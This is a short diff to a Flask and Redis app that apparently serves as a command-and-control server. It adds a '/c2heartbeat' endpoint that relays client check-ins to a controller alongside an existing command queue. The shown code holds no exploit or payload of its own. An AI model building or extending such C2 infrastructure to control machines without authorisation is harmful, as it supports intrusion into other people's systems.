@@ -13,6 +13,7 @@ import redis
 rcon = redis.StrictRedis(host='redisip',port=redisport, db=5)
 prodcons_queue = 'task:prodcons:queue'
 cmd_queue = 'task:cmd:queue'
+heartbeat_queue = 'task:heartbeat:queue'
 
 app = Flask(__name__)
 
@@ -54,6 +55,27 @@ def c2server():
 		rcon.lpush(cmd_queue, cmd_args)
 		return 'ok'
 	return 'ok'
+
+
+
+@app.route('/c2heartbeat')
+def c2heartbeat():
+	if 'control' in request.args:
+		try:
+			results = rcon.rpop(heartbeat_queue)
+		except:
+			return
+		if results != '':
+			return results
+		else:
+			return 'nothing'
+		return 'nothing'
+
+	if 'client' in request.args:
+		heartbeat_args = request.args['client']
+		rcon.lpush(heartbeat_queue, heartbeat_args)
+		return 'ok'
+
 
 @app.route('/test')
 def test():
